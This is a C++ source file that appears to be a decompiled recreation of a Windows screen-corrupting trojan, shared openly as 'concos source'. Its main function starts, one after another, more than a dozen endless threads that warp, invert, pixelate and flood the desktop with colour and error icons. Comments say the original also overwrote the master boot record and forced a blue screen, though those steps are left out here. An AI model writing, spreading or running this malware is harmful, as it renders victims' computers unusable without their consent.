// C:\Users\fuji\source\repos\lol\Release project folder

typedef struct IUnknown IUnknown; //v141_xp compiler requires this in my case

#include <Windows.h>
#define _USE_MATH_DEFINES 1
#include <cmath>

//sorry joshua

DWORD firstWavePayload()
{
    HDC DC = GetDC(0);
    double v3; 
    double v4;
    double v5;
    int v7 = 0;
    int v8 = 10000;
    double v10 = 0;
    double v11 = 0; 
    int w = GetSystemMetrics(0);
    int h = GetSystemMetrics(1);
 
    while(1)
    {      
        v3 = sin(v11) * 5;
        BitBlt(DC, v10, (v3 * 30.0), 2, h, DC, v10, 0, SRCCOPY);
        v10 = v10 + 1.0;
        if (v10 <= w)
        {
            v4 = v11;
        }
        else
        {
            v4 = 0.0;
            v10 = 0.0;
        }
        v5 = v4 + 0.006135923151542565;
        v11 = v5;
        if (v5 > 6.283185307179586)
            v11 = v5 - 6.283185307179586;
        if (++v7 >= 20 * w)
        {
            RedrawWindow(0, 0, 0, 133);
            v7 = 0;
        }
        --v8;
    } 
    return 0;
}

DWORD secondPixelingPayload()
{
    HDC DC = GetDC(0);
    int v3;
    int v4 = 0;
    int v5;
    int v6;

    int w = GetSystemMetrics(0);
    int h = GetSystemMetrics(1);
    v3 = w; //no idea why it sets this 
    v6 = h;

    while (1)
    {
        if (v3 <= 0)
            v4 = 0;
        while (v4 < v3)
        {
            v5 = 0;
            if (h > 0)
            {
                while (v5 < v6)
                {
                    StretchBlt(DC, v4, v5, 14, 14, DC, v4 + 4, v5 + 4, 10, 10, SRCCOPY);
                    StretchBlt(DC, v4, v5, 14, 14, DC, v4, v5, 10, 10, SRCCOPY);
                    h = v6;
                    v5 += 10;
                }
                v3 = w;
            }
            v4 += 10;
        }
    }
}

DWORD thirdPayloadRainbow()
{
    HDC hdc = GetDC(0);
    int w = GetSystemMetrics(0);
    int h = GetSystemMetrics(1);
    int ry, y, cy = h;

    for (;;)
    {
        y = rand() % h;
        ry = rand() % w;
        SelectObject(hdc, CreateSolidBrush((rand() % 255) << 8 | ((rand() % 255)) << 8 | (rand() % 255)));
        BitBlt(hdc, ry, 10, 100, cy, hdc, ry, 0, 0x89345C);
        BitBlt(hdc, ry, -10, -100, cy, hdc, ry, 0, 0x89345C);
        BitBlt(hdc, 10, y, w, 99, hdc, 0, y, 0x89345C);
        BitBlt(hdc, -10, y, w, -99, hdc, 0, y, 0x89345C);
        Sleep(10);
        h = cy;
    }
}

DWORD oneOfFourthMessyPayload()
{
    HDC DC = GetDC(0);
    int w = GetSystemMetrics(0);
    int h = GetSystemMetrics(1);
    int v4, v5, v6, v7, v8, v9, wSrc = w;

    while (1)
    {
        v4 = rand() % h;
        v6 = rand() & 0x80000001;
        v5 = v6 == 0;
        if (v6 < 0)
        {
            v7 = (v6 - 1) | 0xFFFFFFFE;
            v5 = v7 == -1;
            v6 = v7 + 1;
        }
        if (v5)
        {
            v8 = w + 12;
            StretchBlt(DC, 1, v4, v8, v4, DC, 0, v4, wSrc, v4, SRCINVERT); //im not joking, this is really was here 
            StretchBlt(DC, 1, v4, v8, v4, DC, 0, v4, wSrc, v4, SRCINVERT);
            StretchBlt(DC, 1, v4, v8, v4, DC, 0, v4, wSrc, v4, SRCINVERT);
            StretchBlt(DC, 1, v4, v8, v4, DC, 0, v4, wSrc, v4, SRCINVERT);
            StretchBlt(DC, 1, v4, v8, v4, DC, 0, v4, wSrc, v4, SRCINVERT);
            StretchBlt(DC, 1, v4, v8, v4, DC, 0, v4, wSrc, v4, SRCINVERT);
            StretchBlt(DC, 1, v4, v8, v4, DC, 0, v4, wSrc, v4, SRCINVERT);
            StretchBlt(DC, 1, v4, v8, v4, DC, 0, v4, wSrc, v4, SRCINVERT);
            StretchBlt(DC, 1, v4, v8, v4, DC, 0, v4, wSrc, v4, SRCINVERT);
        }
        else if (v6 == 1)
        {
            v9 = w + 12;
            StretchBlt(DC, 0, v4, wSrc, v4, DC, 1, v4, v9, v4, SRCPAINT);
            StretchBlt(DC, 0, v4, wSrc, v4, DC, 1, v4, v9, v4, SRCPAINT);
            StretchBlt(DC, 0, v4, wSrc, v4, DC, 1, v4, v9, v4, SRCPAINT);
            StretchBlt(DC, 0, v4, wSrc, v4, DC, 1, v4, v9, v4, SRCPAINT);
            StretchBlt(DC, 0, v4, wSrc, v4, DC, 1, v4, v9, v4, SRCPAINT);
            StretchBlt(DC, 0, v4, wSrc, v4, DC, 1, v4, v9, v4, SRCPAINT);
            StretchBlt(DC, 0, v4, wSrc, v4, DC, 1, v4, v9, v4, SRCPAINT);
            StretchBlt(DC, 0, v4, wSrc, v4, DC, 1, v4, v9, v4, SRCPAINT);
            StretchBlt(DC, 0, v4, wSrc, v4, DC, 1, v4, v9, v4, SRCPAINT);
        }
    }
}

DWORD secondOfFourthMessyPayload()
{
    HDC DC = GetDC(0);
    POINT Point;

    GetSystemMetrics(0);
    GetSystemMetrics(1);
    while (1)
    {
        GetCursorPos(&Point);
        DrawIcon(DC, Point.x, Point.y, LoadIconW(0, IDI_HAND));
    }
}

DWORD hardestPayloadEver()
{
    HDC DC = GetDC(0);
    int w = GetSystemMetrics(0);
    int h = GetSystemMetrics(1);

    while (1)
    {
        BitBlt(DC, -1, -1, w, h, DC, 0, 0, SRCINVERT);
    }
}

DWORD fifthUnknownPayload()
{
    HDC hdc = GetDC(0);
    int w = GetSystemMetrics(0);
    int h = GetSystemMetrics(1);

    for (;;)
    {
        int rw = rand() % w;
        int rh = rand() % h;
        int v7 = rh + rand() % 21 - 10;
        BitBlt(hdc, rw, rh, 2, 2, hdc, rw + rand() % 21 - 10, v7, SRCINVERT);
        int v8 = rh + rand() % 21 - 10;
        BitBlt(hdc, rw, rh, 2, 2, hdc, rw + rand() % 21 - 10, v8, 0x440328u);
    }
}

DWORD sixthMessPayload()
{
    HDC hdc = GetDC(0);

    int w = GetSystemMetrics(0);
    int h = GetSystemMetrics(1);

    for (;;)
    {
        int v5 = w - 5;
        int v6 = w - 20;
        StretchBlt(hdc, -5, -5, v6, v5, hdc, 0, 0, w, h, NOTSRCERASE);
        StretchBlt(hdc, 5, 5, v6, v5, hdc, 0, 0, w, h, NOTSRCERASE);
        StretchBlt(hdc, -5, -5, v6, w - 5, hdc, 0, 0, h, w, SRCINVERT);
        StretchBlt(hdc, 5, 5, v6, w - 5, hdc, 0, 0, h, w, SRCINVERT);
        Sleep(rand() % 500);
    }
}

DWORD seventhWhiteDots()
{
    HDC hdc = GetDC(0);
    int w = GetSystemMetrics(0);
    int h = GetSystemMetrics(1);

    for (;;)
    {
        int v3 = rand() % w;
        int v4 = rand() % h;
        int v7 = v4 + rand() % 21 - 10;
        BitBlt(hdc, v3, v4, 2, 2, hdc, v3 + rand() % 21 - 10, v7, NOTSRCCOPY);
        Sleep(rand() % 54);
    }
}

DWORD eightStrangePayload()
{
    HDC dc = GetDC(0);
    RECT Rect;
    POINT Point;
    int v24, v25, v26, v27;

    int v20 = rand() % 1000;
    int w = GetSystemMetrics(0);
    int h = GetSystemMetrics(1);

    for (;;)
    {
        int v13 = rand() % h;
        int v12 = rand() % w;
        GetWindowRect(GetDesktopWindow(), &Rect);
        Point.x = Rect.left - rand() % 1010 + 500;
        Point.y = Rect.left - rand() % 2001 + 1000;
        v24 = Rect.left - rand() % 2001 + 1000;
        v25 = rand() % 4100 + Rect.left + 2000;
        v26 = v20 + 1000 + Rect.left - rand() % 2100;
        v27 = v20 + 1000 + Rect.left - rand() % 2010;
        PlgBlt(dc, &Point, dc, Rect.left, Rect.top, Rect.right - Rect.left, Rect.bottom - Rect.top, 0, 0, 0);
        StretchBlt(dc, 0, rand() % h, w, v13, dc, v12, v13, 1, 1, SRCINVERT);
        StretchBlt(dc, 0, 0, w, h, dc, rand() % w, v13, 1, 1, SRCINVERT);
        StretchBlt(dc, 0, 0, w, h, dc, rand() % w, v13, w, h, SRCERASE);
        StretchBlt(dc, 0, 0, w, h, dc, rand() % w, v13, w, h, SRCAND);
        StretchBlt(dc, 0, 0, w, h, dc, -(rand() % w), v13, w, h, SRCPAINT);
        StretchBlt(dc, 0, 0, w, h, dc, -(rand() % w), v13, w, h, SRCPAINT);
    }
}

DWORD anotherHardestPayloadEver()
{
    HDC hdc = GetDC(0);
    int w = GetSystemMetrics(0);
    int h = GetSystemMetrics(1);

    for (;;)
    {
        int v3 = rand() % w;
        int v4 = rand() % h;
        BitBlt(hdc, v3, v4, 2005699644 /*why*/, 2005699644, hdc, v3 - 1, v4 - 1, SRCCOPY);
    }
}

DWORD almostLastPayloadCubes()
{
    HDC DC = GetDC(0);
    int w = GetSystemMetrics(0);
    int h = GetSystemMetrics(1);

    while (1)
    {
        int v3 = rand() % w;
        int v4 = rand() % h;
        int v5 = (rand() & 3) == 0;
        int v6 = 1949469134;
        if (v5)
            v6 = 130168990;
        int v9 = v6;
        int v8 = v3 + rand() % 456 - 10;
        BitBlt(DC, v4, v3, 100, 100, DC, v4 + rand() % 3456 - 10, v8, v9);
    }
}

DWORD strangeTunnel()
{
    HDC hdcDest = GetDC(0);
    int w = GetSystemMetrics(0);
    int h = GetSystemMetrics(1);

    while (1)
    {
        StretchBlt(hdcDest, -10, -10, w - 20, h - 20, hdcDest, 0, 0, w, h, 0x440328u);
        StretchBlt(hdcDest, 10, 10, w - 20, h - 20, hdcDest, 0, 0, w, h, 0x660046u);
    }
}

DWORD lastPayload()
{
    HDC DC = GetDC(0);
    int w = GetSystemMetrics(0);
    int h = GetSystemMetrics(1);

    while (1)
    {
        SelectObject(DC, CreateSolidBrush(RGB(rand() % 255, rand() % 255, rand() % 255)));
        BitBlt(DC, 0, 0, w, h, DC, 0, 0, PATINVERT);
        Sleep(1);
    }
}

int main()
{
    HANDLE firstWavePayloadHandle = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)firstWavePayload, 0, 0, 0);
    Sleep(10000);
    HANDLE secondPixelingPayloadHandle = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)secondPixelingPayload, 0, 0, 0);
    Sleep(5000);
    HANDLE thirdPayloadRainbowHandle = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)thirdPayloadRainbow, 0, 0, 0);
    Sleep(4000);
    HANDLE oneOfFourthMessyPayloadHandle = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)oneOfFourthMessyPayload, 0, 0, 0);
    HANDLE secondOfFourthMessyPayloadHandle = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)secondOfFourthMessyPayload, 0, 0, 0);
    //was MBR here, dont putting it (if mbr was here, you just can reboot when its 1,2 or 3 payload running and get ur system working back lmao)
    HANDLE hardestPayloadEverHandle = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)hardestPayloadEver, 0, 0, 0);
    Sleep(5000);
    HANDLE fifthUnknownPayloadHandle = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)fifthUnknownPayload, 0, 0, 0);
    Sleep(2000);
    HANDLE sixthMessPayloadHandle = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)sixthMessPayload, 0, 0, 0);
    Sleep(5000);
    HANDLE seventhWhiteDotsHandle = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)seventhWhiteDots, 0, 0, 0);
    Sleep(7000);
    //this was here: https://imgur.com/a/v0tZxId
    HANDLE eightStrangePayloadHandle = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)eightStrangePayload, 0, 0, 0);
    Sleep(10000);
    HANDLE anotherHardestPayloadEverHandle = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)anotherHardestPayloadEver, 0, 0, 0);
    HANDLE almostLastPayloadCubesHandle = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)almostLastPayloadCubes, 0, 0, 0); 
    Sleep(6000);
    HANDLE strangeTunnelHandle = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)strangeTunnel, 0, 0, 0);
    HANDLE lastPayloadHandle = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)lastPayload, 0, 0, 0);
    Sleep(120000);
    //bsod here

    //enjoj concos source

}